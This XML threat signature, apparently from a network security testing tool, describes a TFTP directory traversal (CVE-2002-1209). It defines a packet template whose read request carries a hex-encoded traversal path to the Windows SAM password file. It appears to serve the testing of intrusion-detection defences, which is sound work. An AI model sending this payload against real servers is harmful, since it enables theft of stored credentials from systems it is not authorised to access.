<?xml version="1.0" encoding="utf-8"?>
<threatSignature>
  <ThreatProperties>
    <ExecDesc display="true" value="TFTP Directory Traversal"/>
    <EngDesc display="true" value="This threat tries to grab a file (in this case, a Windows SAM file) over TFTP. Many TFTP servers are misconfigured by default and let an attacker at any file on the system without any authentication. TFTP servers typically listen on UDP port 69."/>
    <Intent display="true">
      <item value="Unauthorized_Access"/>
    </Intent>
    <Protocol display="true" value="TFTP"/>
    <Type_Of_Equipment display="true">
      <item value="Protocol"/>
    </Type_Of_Equipment>
    <Known_Vendors_Affected display="true"/>
    <Known_Products_Affected display="true"/>
    <Known_Versions_Affected display="true"/>
    <Credit display="true" value="http://www.idefense.com/advisory/10.24.02.txt"/>
    <CVEID display="true" value="CVE-2002-1209"/>
    <bugtraqID display="true" value="6045"/>
    <OSVDB display="true" value="8947"/>
    <Author display="true" value="Seth Hardy"/>
    <ID display="true" value="00000105981880e700c000a80001003c616c705b"/>
    <Revision display="true" value="1"/>
    <Safe display="true" value="true"/>
    <SoftwareRevision display="true" value="1.4"/>
    <Suite display="true" value="Standard"/>
    <RunOnce display="false" value="false"/>
    <Valid_Traffic display="false" value="false"/>
    <AccessVector display="false" value="remote"/>
    <AccessComplexity display="false" value="low"/>
    <Authentication display="false" value="not-required"/>
    <ConfImpact display="false" value="partial"/>
    <IntegImpact display="false" value="none"/>
    <AvailImpact display="false" value="none"/>
    <ImpactBias display="false" value="normal"/>
    <FirstAdded display="false" value=""/>
    <LastModified display="false" value="632742243416718750"/>
    <SigStyle display="false" value="Matching"/>
    <targetNode display="false" value="A"/>
    <SigProtocol display="false" value="TFTP_RRQ"/>
    <Rate display="false" value="1"/>
    <Regex display="false" value=""/>
    <Created value="1139462510" display="false"/>
    <ServerSideAttack display="false" value="false"/>
  </ThreatProperties>
  <Variables>
    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
    <NamedVar name="TFTPdestPort" type="ImperfectControls.Port" value="null" index="F"/>
  </Variables>
  <Loops>
    <for index="A">
      <for index="B"/>
      <for index="C"/>
      <for index="D"/>
      <for index="F"/>
    </for>
  </Loops>
  <Output index="A" Count="">
    <Ethernet srcMac="@random(00:00:00:00:00:00,FF:FF:FF:FF:FF:FF)" destMac="$destMAC" pktType="0800">
      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="" Identification="0000" FragmentOffset="0000" TTL="40" Protocol="11" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
        <UDP srcPort="@random(1025,65535)" destPort="$TFTPdestPort" checksum="" length="">
          <TFTP_RRQ OpCode="0001" FilenameNullTerm="615C2E2E5C2E2E5C77696E6E745C7265706169725C73616D00" ModeNullTerm="6F6374657400"/>
        </UDP>
      </IP>
    </Ethernet>
  </Output>
</threatSignature>
